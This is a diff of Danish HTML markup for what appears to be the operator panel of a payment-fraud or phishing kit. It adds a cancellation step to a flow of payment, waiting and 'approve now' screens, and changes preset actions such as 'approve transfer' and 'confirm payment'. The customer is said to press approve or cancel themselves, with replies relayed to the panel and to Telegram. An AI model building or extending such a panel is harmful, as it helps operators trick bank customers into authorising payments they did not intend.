@@ -135,12 +135,16 @@
                 <span class="flow-num">3</span>
                 <span class="flow-label">Betaling</span>
               </button>
-              <button class="flow-btn flow-wait" id="flowWaitBtn">
+              <button class="flow-btn flow-annuller" id="flowAnnullerBtn">
                 <span class="flow-num">4</span>
+                <span class="flow-label">Annullering</span>
+              </button>
+              <button class="flow-btn flow-wait" id="flowWaitBtn">
+                <span class="flow-num">5</span>
                 <span class="flow-label">Venter</span>
               </button>
               <button class="flow-btn flow-approve" id="flowApproveBtn">
-                <span class="flow-num">5</span>
+                <span class="flow-num">6</span>
                 <span class="flow-label">Godkend Nu</span>
               </button>
             </div>
@@ -171,7 +175,8 @@
             <p class="sub">Vælg en færdig handling eller skriv din egen. Kunden trykker selv GODKEND/ANNULLER — svaret kommer her og på Telegram.</p>
             <label>Færdiglavede handlinger</label>
             <div class="preset-row">
-              <button class="preset-chip" data-preset-title="Godkend dette køb" data-preset-focus="actionAmount">🛒 Godkend dette køb</button>
+              <button class="preset-chip" data-preset-title="Slet denne betaling" data-preset-focus="actionAmount">🛒 Slet denne betaling</button>
+              <button class="preset-chip preset-red" data-preset-title="Annullering af betaling" data-preset-focus="actionAmount">❌ Annullering af betaling</button>
               <button class="preset-chip" data-preset-title="Annullering af betaling" data-preset-focus="actionAmount">❌ Annullering af betaling</button>
               <button class="preset-chip" data-preset-title="Bekræft betaling" data-preset-focus="actionAmount">💳 Bekræft betaling</button>
               <button class="preset-chip" data-preset-title="Godkend overførsel" data-preset-focus="actionAmount">🏦 Godkend overførsel</button>
